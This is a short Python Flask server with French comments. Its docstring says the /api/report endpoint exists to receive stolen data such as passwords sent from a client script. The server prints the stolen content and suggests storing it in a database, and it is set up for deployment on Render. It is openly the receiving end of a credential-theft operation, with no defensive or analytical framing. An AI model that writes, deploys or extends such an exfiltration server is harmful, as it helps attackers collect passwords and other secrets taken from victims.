from flask import Flask, request
import subprocess

app = Flask(__name__)

@app.route('/', methods=['GET'])
def home():
    return "Server is running."

@app.route('/api/report', methods=['POST'])
def report():
    """
    Endpoint pour recevoir les données volées (mots de passe, etc.)
    depuis le script client.
    """
    data = request.json
    content = data.get('content', '')
    
    print(f"recu : {content}")
    
    # Ici vous pourriez sauvegarder dans une BDD ou un fichier
    # Sur Render, le système de fichier est éphémère, donc juste print ou BDD externe.
    
    return {"status": "received"}

if __name__ == '__main__':
    # Sur Render, gunicorn utilisera 'server:app'
    app.run(host='0.0.0.0', port=5000)
